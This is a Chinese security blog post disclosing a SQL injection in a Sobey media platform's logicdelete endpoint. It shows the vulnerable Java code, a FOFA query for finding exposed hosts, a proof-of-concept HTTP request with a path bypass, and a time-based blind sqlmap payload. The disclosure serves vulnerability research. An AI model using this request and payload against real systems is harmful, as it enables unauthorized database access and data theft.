---
title: "索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/logicdelete SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-WXArticleInt-logicdelete-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchwxarticleintlogicdelete-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/logicdelete SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/29 08:18
* 574浏览
* [0评论](#comment)
* 15分钟阅读

深入探索

SQL

数据库

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/WXArticleInt/logicdelete 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入防护

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`mch/WXArticleInt/logicdelete`的实现逻辑

```
@RequestMapping(
    value = {"/logicdelete"},
    method = {RequestMethod.POST}
)
public Response logicDelete(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("id") String id) {
    JSONObject userinfo = (JSONObject)this.req.getAttribute("userinfo");
    Response response = new Response();
    response.setStatus(200);
    response.setMessage(this.enTips("wxarticle.logicdelete.success", "删除成功！"));
    response.setData("");
    if (StringUtils.isEmpty(id)) {
        return response;
    } else {
        try {
            id.replaceAll("^,|,$", "");
            QueryBuilder qb = new QueryBuilder("update zcnwxarticle SET ifval='0' where id IN(" + id + ")");
            qb.executeNoQuery();
```

深入探索

恶意软件分析工具

文件大小转换

安全工具开发

代码一看就很明了了，**id**是被直接拼接在in子语句中，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /sobey-mchEditor/js/..;/mch/WXArticleInt/logicdelete HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

siteCode=&id=SQLI_POC&token=
```

[![索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/logicdelete SQL注入漏洞](images/img-001-3b7f7a393850.webp)](https://image.mrxn.net/4cd340469acd4cc4819091fa4297ae23.webp)

成功延时 5 秒

代码安全审计

深入探索

网络安全培训

编程语言教程

安全研究工具

[sqlmap](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: siteCode=&id=1 AND (SELECT 2804 FROM (SELECT(SLEEP(5)))MDfc)&token=
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#sqlmap](https://mrxn.net/tag/sqlmap)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/mch/WXArticleInt/logicdelete SQL注入漏洞](https://mrxn.net/jswz/sobey-WXArticleInt-logicdelete-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-WXArticleInt-logicdelete-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-WXArticleInt-logicdelete-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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